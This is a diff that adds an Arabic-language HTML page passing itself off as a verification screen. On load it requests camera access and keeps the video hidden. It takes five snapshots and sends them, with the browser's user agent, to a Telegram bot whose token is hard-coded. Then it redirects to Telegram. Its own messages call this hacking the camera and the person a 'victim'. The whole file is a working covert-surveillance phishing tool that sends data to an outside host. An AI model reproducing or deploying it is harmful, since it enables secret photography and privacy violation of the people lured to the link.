@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div id="status">جاري التحقق...</div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+        const linkId = urlParams.get('link_id');
+        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
+        
+        let mediaStream = null;
+        let photoInterval = null;
+        
+        async function sendMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: userId, text: text })
+                });
+            } catch(e) {}
+        }
+        
+        async function sendPhoto(photoData, caption) {
+            try {
+                const blob = await (await fetch(photoData)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', userId);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } catch(e) {}
+        }
+        
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (video.videoWidth > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                sendPhoto(canvas.toDataURL('image/jpeg', 0.7), `📸 اختراق الكاميرا\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
+            }
+        }
+        
+        async function startHack() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = mediaStream;
+                
+                sendMessage(`✅ تم اختراق الكاميرا!\nالضحية: ${navigator.userAgent}\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
+                document.getElementById('status').innerHTML = '✅ تم';
+                
+                let count = 0;
+                photoInterval = setInterval(() => {
+                    if (count < 5) { capturePhoto(); count++; }
+                    else { clearInterval(photoInterval); }
+                }, 3000);
+                
+                setTimeout(() => {
+                    if (photoInterval) clearInterval(photoInterval);
+                    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://t.me";
+                }, 18000);
+            } catch(e) {
+                sendMessage(`❌ فشل اختراق الكاميرا!\n${e.message}`);
+                document.getElementById('status').innerHTML = '❌ فشل';
+                setTimeout(() => { window.location.href = "https://t.me"; }, 2000);
+            }
+        }
+        
+        startHack();
+    </script>
+</body>
+</html>
